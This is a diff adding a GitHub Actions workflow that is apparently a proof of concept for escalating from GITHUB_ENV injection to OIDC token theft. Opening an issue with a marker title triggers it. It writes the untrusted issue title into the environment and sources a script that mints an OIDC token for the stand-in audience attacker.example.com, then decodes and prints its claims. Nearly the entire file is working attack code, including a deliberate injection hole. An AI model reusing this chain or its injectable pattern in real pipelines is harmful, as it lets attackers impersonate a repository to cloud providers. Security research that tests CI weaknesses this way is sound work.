@@ -1,0 +1,61 @@
+name: OIDC chain escalation PoC
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  oidc-chain:
+    runs-on: ubuntu-latest
+    if: contains(github.event.issue.title, 'oidc-chain-test')
+    steps:
+      - name: Process issue (GITHUB_ENV injection)
+        run: |
+          echo "ISSUE_DATA=${{ github.event.issue.title }}" >> $GITHUB_ENV
+          # The attacker's BASH_ENV would be injected here via title newline
+          # For this test, directly set BASH_ENV to the OIDC-minting script
+          cat > /tmp/oidc_mint.sh << 'SCRIPTEOF'
+          # This runs BEFORE the victim step via BASH_ENV sourcing
+          export OIDC_MINTED=true
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            export OIDC_URL_AVAILABLE=true
+            # Mint an OIDC token with custom audience
+            OIDC_TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://attacker.example.com" 2>/dev/null | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('value',''))" 2>/dev/null)
+            if [ -n "$OIDC_TOKEN" ]; then
+              export OIDC_TOKEN_MINTED=true
+              export OIDC_TOKEN_LEN=${#OIDC_TOKEN}
+              # Decode claims (header.payload.signature)
+              PAYLOAD=$(echo "$OIDC_TOKEN" | cut -d. -f2 | tr +/ -_ | tr -d = | base64 -d 2>/dev/null)
+              export OIDC_SUB=$(echo "$PAYLOAD" | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('sub',''))" 2>/dev/null)
+              export OIDC_AUD=$(echo "$PAYLOAD" | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('aud',''))" 2>/dev/null)
+              export OIDC_ISS=$(echo "$PAYLOAD" | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('iss',''))" 2>/dev/null)
+            fi
+          fi
+          SCRIPTEOF
+          
+      - name: Victim step with OIDC permissions (simulates CI/CD deployment)
+        run: |
+          # Source the OIDC minting script (simulates BASH_ENV sourcing)
+          source /tmp/oidc_mint.sh
+          
+          echo "=== CHAIN ESCALATION: GITHUB_ENV -> OIDC ==="
+          echo "OIDC_MINTED=$OIDC_MINTED"
+          echo "OIDC_URL_AVAILABLE=$OIDC_URL_AVAILABLE"
+          echo "OIDC_TOKEN_MINTED=$OIDC_TOKEN_MINTED"
+          echo "OIDC_TOKEN_LEN=$OIDC_TOKEN_LEN"
+          echo "OIDC_SUB=$OIDC_SUB"
+          echo "OIDC_AUD=$OIDC_AUD"
+          echo "OIDC_ISS=$OIDC_ISS"
+          echo ""
+          if [ "$OIDC_TOKEN_MINTED" = "true" ]; then
+            echo "CRITICAL: Attacker minted OIDC token via GITHUB_ENV injection!"
+            echo "Token audience: $OIDC_AUD (attacker-controlled)"
+            echo "Token subject: $OIDC_SUB (repo identity)"
+            echo "Token issuer: $OIDC_ISS"
+            echo ""
+            echo "Impact: attacker impersonates this repo to ANY cloud provider"
+            echo "that trusts GitHub OIDC tokens (AWS, GCP, Azure)"
+          fi
